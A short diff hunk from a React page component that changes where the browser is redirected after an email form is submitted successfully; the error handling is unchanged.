@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://scoline.abruis.io';
+        window.location.href = 'https://sca.cinco-austra.pro/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
